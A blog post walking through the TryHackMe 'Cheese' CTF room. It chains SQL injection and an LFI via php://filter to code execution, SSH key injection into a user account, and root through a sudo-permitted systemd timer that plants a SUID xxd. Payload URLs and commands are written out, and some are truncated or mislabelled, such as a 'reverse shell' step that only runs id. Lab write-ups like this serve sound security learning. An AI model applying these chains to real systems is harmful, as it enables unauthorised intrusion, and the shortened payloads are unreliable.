---
layout: post  # Use your theme's default post layout, or 'page' if it's a static page
title: "Tryhackme Cheese Walkthrough - Pentest Lab Notes"
date: 2025-07-27 # Adjust timezone if needed
categories: [tryhackme, walkthrough]
tags: [ctf, enumeration, exploit, Cheese, writeups, htb, writeups, tryhackme, Linux, wordpress, cracking, walkthrough]
author: h4ck3rfirst
---

# CheeseCTF Writeup - TryHackMe

**Difficulty:** Medium-High  

This is a write-up for the **CheeseCTF** room on TryHackMe, which involves exploiting a vulnerable web application to escalate privileges and capture the user and root flags.

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Foothold](#foothold)
- [Privilege Escalation](#privilege-escalation)
- [Root Flag](#root-flag)
  
---

## Reconnaissance

### Initial Scan

We start by scanning the target with Nmap to discover any open ports:

```bash
nmap -sC -sV -p- 10.10.145.132
```

We find a website with a login form. After attempting manual SQL injection exploits, we turn to sqlmap for further testing:

```
 sqlmap -r login
```
sqlmap identifies a vulnerability in the username parameter and suggests MySQL as the back-end DBMS. We attempt an injection and receive a redirect to a hidden page:

```
http://10.10.145.132/secret-script.php?file=supersecretadminpanel.html
```
After further exploration, we notice that the site is vulnerable to Local File Inclusion (LFI) via the php://filter wrapper.

### Exploit LFI

We test the LFI vulnerability by including the /etc/passwd file:
```
http://10.10.145.132/secret-script.php?file=php://filter/resource=../../../etc/passwd
```
This reveals a list of users, including comte, which we target for further enumeration.
## Foothold
Exploiting LFI to RCE

By chaining multiple PHP filters, we craft a payload that executes PHP code remotely on the server:
```
 python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
```
We use the generated payload to trigger PHP code execution via the LFI:
```
http://10.10.145.132/secret-script.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.base64-decode/resource=php://temp
```
This confirms we can run arbitrary PHP code on the server.

## Gaining Access

We then use a reverse shell payload to gain access as the www-data user:
```
http://10.10.145.132/secret-script.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```
We receive the shell output confirming we are logged in as www-data:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

Next, we inspect the comte user's home directory and find an authorized_keys file inside the .ssh folder, where we can add our public SSH key.

**SSH Key Injection**

We generate an SSH key pair, then add the public key to the authorized_keys file:
```
 ssh-keygen -t rsa
 chmod 600 temp_id_rsa
 cat temp_id_rsa.pub
 echo "<public_key>" >> authorized_keys
```
After doing so, we can SSH into the comte user’s account and retrieve the user flag:
```
 ssh -i temp_id_rsa comte@10.10.145.132
 cat user.txt
THM{9f2c**REDACTED**b17a}
```
## Privilege Escalation

Sudo Privileges

As the comte user, we check for available sudo privileges:
```
 sudo -l
```
We discover that comte can run several systemctl commands without a password:
```
(ALL) NOPASSWD: /bin/systemctl daemon-reload
(ALL) NOPASSWD: /bin/systemctl restart exploit.timer
(ALL) NOPASSWD: /bin/systemctl start exploit.timer
(ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```
This indicates that the user can manipulate a systemd timer called exploit.timer. We check the system for any exploit.service files:
```
 cat /etc/systemd/system/*.service
```
We find that the exploit.service copies the xxd binary to the /opt directory and sets the SUID bit, allowing anyone to execute it with root privileges.

**Fixing the Exploit Timer**

The timer file /etc/systemd/system/exploit.timer is misconfigured with an empty OnBootSec value. We modify it to trigger immediately upon activation:
```
 sudo nano /etc/systemd/system/exploit.timer
```
We set OnBootSec and OnUnitActiveSec to 0 for immediate execution:

[Unit]
Description=Exploit Timer

[Timer]
OnUnitActiveSec=0
OnBootSec=0

[Install]
WantedBy=timers.target

Triggering the Exploit

We start the timer:
```
sudo systemctl start exploit.timer
```
This triggers the associated exploit.service, which places the xxd binary in /opt with SUID. We use xxd to read the root.txt flag:
```
 /opt/xxd "/root/root.txt" | xxd -r
```
**THM{dca75**REDACTED**167c}**

**Root Flag**

Once we gain root access, we are able to retrieve the root flag located in /root/root.txt:
```
 cat /root/root.txt
THM{dca75**REDACTED**167c}
```
## **Conclusion**

This CTF involved several vulnerabilities, including SQL injection, Local File Inclusion (LFI), Remote Code Execution (RCE), and privilege escalation through systemd timers and SUID binaries. Each step required a careful combination of techniques to gain access to both the user and root flags.
Tools Used

  nmap: Network scanning

   sqlmap: Automated SQL injection

   php_filter_chain_generator: LFI to RCE exploitation

   ssh-keygen: SSH key generation

   systemctl: Interacting with systemd services

   xxd: File inspection with SUID privilege escalation
